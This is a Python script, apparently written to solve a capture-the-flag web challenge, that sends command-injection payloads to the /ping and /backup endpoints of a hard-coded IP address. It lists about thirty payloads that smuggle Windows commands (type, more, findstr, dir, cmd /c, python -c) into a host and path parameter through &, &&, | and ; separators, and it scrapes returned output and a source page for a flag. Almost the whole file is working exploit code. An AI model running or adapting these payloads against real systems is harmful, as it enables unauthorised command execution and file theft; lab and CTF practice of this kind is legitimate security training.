import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("深度测试Ping命令执行 - 寻找Flag")
print("="*70)

# Windows命令执行payload
# 尝试不同的命令分隔符和路径

ping_payloads = [
    # 尝试type命令读取文件
    "127.0.0.1 & type F:\\flag.txt",
    "127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt",
    "127.0.0.1 & type flag.txt",
    "127.0.0.1 & type .\\flag.txt",
    "127.0.0.1 & type ..\\flag.txt",
    # 使用&&
    "127.0.0.1 && type F:\\flag.txt",
    "127.0.0.1 && type F:\\small peoject\\python-lab\\flag.txt",
    # 使用|
    "127.0.0.1 | type F:\\flag.txt",
    "127.0.0.1 | type F:\\small peoject\\python-lab\\flag.txt",
    # 使用;
    "127.0.0.1; type F:\\flag.txt",
    "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
    # 使用cmd
    "127.0.0.1 & cmd /c type F:\\flag.txt",
    "127.0.0.1 && cmd /c type F:\\flag.txt",
    # 使用more命令
    "127.0.0.1 & more F:\\flag.txt",
    "127.0.0.1 && more F:\\flag.txt",
    # 使用findstr搜索flag
    "127.0.0.1 & findstr /s /i flag F:\\*.*",
    "127.0.0.1 && findstr /s /i flag F:\\*.*",
    # 使用dir搜索
    "127.0.0.1 & dir F:\\ /s /b | findstr flag",
    "127.0.0.1 && dir F:\\ /s /b | findstr flag",
    # 使用python读取文件
    "127.0.0.1 & python -c \"print(open('F:\\flag.txt').read())\"",
    "127.0.0.1 && python -c \"print(open('F:\\flag.txt').read())\"",
    # 不带IP直接执行
    "& type F:\\flag.txt",
    "&& type F:\\flag.txt",
    "| type F:\\flag.txt",
    "; type F:\\flag.txt",
]

for payload in ping_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=15)
        if r.status_code == 200:
            # 提取<pre>标签内容
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                # 只显示有实际响应的（排除ping结果和Blocked）
                if len(content) > 50:
                    # 检查是否包含命令执行结果（非ping结果）
                    if "Blocked" not in content:
                        # 检查是否有额外的输出（命令执行结果）
                        lines = content.split('\n')
                        extra_output = [line for line in lines if 'ping' not in line.lower() and '字节' not in line and 'TTL' not in line and '统计' not in line]
                        
                        if extra_output:
                            print(f"\n>>> Payload: {payload}")
                            print(f"额外输出: {extra_output[:10]}")
                            
                            # 搜索flag
                            for line in extra_output:
                                flag_match = re.search(r'flag\{[^}]+\}', line, re.IGNORECASE)
                                if flag_match:
                                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                                    exit(0)
    except Exception as e:
        print(f"错误: {e}")

print("\n" + "="*70)
print("测试Backup命令执行")
print("="*70)

backup_payloads = [
    # 尝试读取flag文件
    "F:\\flag.txt",
    "F:\\small peoject\\python-lab\\flag.txt",
    # 尝试命令注入
    "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
    "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
]

for payload in backup_payloads:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n>>> Payload: {payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试读取源码中的flag")
print("="*70)

try:
    r = session.get(f"{TARGET}/upload-source", timeout=15)
    if r.status_code == 200:
        # 提取源码
        source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
        if source_match:
            source = source_match.group(1)
            print(f"源码长度: {len(source)}")
            
            # 在源码中搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND IN SOURCE: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
            
            # 搜索FLAG相关变量
            flag_vars = re.findall(r'FLAG\s*=\s*["\']([^"\']+)["\']', source)
            if flag_vars:
                print(f"FLAG变量: {flag_vars}")
except:
    pass

print("\n测试完成 - 未找到flag")